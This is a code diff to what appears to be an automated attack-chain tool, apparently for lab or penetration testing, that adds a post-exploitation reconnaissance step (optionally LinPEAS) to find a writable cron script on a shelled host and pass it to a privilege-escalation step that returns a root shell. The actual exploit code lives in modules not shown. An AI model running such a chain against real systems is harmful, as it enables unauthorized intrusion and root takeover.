@@ -51,6 +51,11 @@ STEP_META = {
         "techniques": ["T1190", "T1059.004"],
         "color": "yellow",
     },
+    "post_exploit_recon": {
+        "tactic": "TA0007 · Discovery",
+        "techniques": ["T1082", "T1087.001", "T1057", "T1053.003", "T1016", "T1552.001"],
+        "color": "blue",
+    },
     "privesc": {
         "tactic": "TA0004 · Privilege Escalation",
         "techniques": ["T1053.003", "T1068"],
@@ -79,6 +84,7 @@ class Context:
     kali_host: str = DEFAULT_KALI_HOST
     wordlist: str = DEFAULT_WORDLIST
     mode: str = "basic"
+    linpeas: bool = True
     state: dict[str, Any] = field(default_factory=dict)
 
 
@@ -217,10 +223,23 @@ def _step_exploit(ctx: Context) -> dict[str, Any]:
     return {"www_shell": www_shell}
 
 
+def _step_post_exploit_recon(ctx: Context) -> dict[str, Any]:
+    from post_exploit_recon import run as recon_run
+
+    findings = recon_run(www_shell=ctx.state["www_shell"], kali_host=ctx.kali_host, use_linpeas=ctx.linpeas)
+    if not findings.get("cron_script"):
+        raise RuntimeError("post-exploit recon found no writable cron script — cannot escalate")
+    return findings
+
+
 def _step_privesc(ctx: Context) -> dict[str, Any]:
     from privesc import run as privesc_run
 
-    root_shell = privesc_run(ctx.state["www_shell"], kali_host=ctx.kali_host)
+    root_shell = privesc_run(
+        ctx.state["www_shell"],
+        kali_host=ctx.kali_host,
+        cron_script=ctx.state["cron_script"],
+    )
     if root_shell is None:
         raise RuntimeError("privesc returned no root shell")
     return {"root_shell": root_shell}
@@ -273,9 +292,14 @@ CHAIN_BASIC: list[Step] = [
     Step("recon", _step_recon),
     Step("exploit", _step_exploit, teardown=_teardown_close_socket("www_shell")),
     Step(
+        "post_exploit_recon",
+        _step_post_exploit_recon,
+        requires=("www_shell",),
+    ),
+    Step(
         "privesc",
         _step_privesc,
-        requires=("www_shell",),
+        requires=("www_shell", "cron_script"),
         teardown=_teardown_close_socket("root_shell"),
     ),
     Step(
@@ -464,6 +488,8 @@ def _parse_args(argv: list[str]) -> argparse.Namespace:
     sel.add_argument("--only", choices=step_names)
     sel.add_argument("--from", dest="start", choices=step_names)
     p.add_argument("--to", dest="stop", choices=step_names)
+    p.add_argument("--no-linpeas", dest="linpeas", action="store_false", default=True,
+                   help="Skip LinPEAS and use targeted commands only (default: LinPEAS enabled)")
     p.add_argument("--list", action="store_true")
     p.add_argument("-v", "--verbose", action="store_true")
 
@@ -509,6 +535,7 @@ def main(argv: list[str] | None = None) -> int:
         kali_host=args.kali_host,
         wordlist=args.wordlist,
         mode=args.mode,
+        linpeas=args.linpeas,
     )
     run_chain(ctx, only=args.only, start=args.start, stop=args.stop)
     return 0
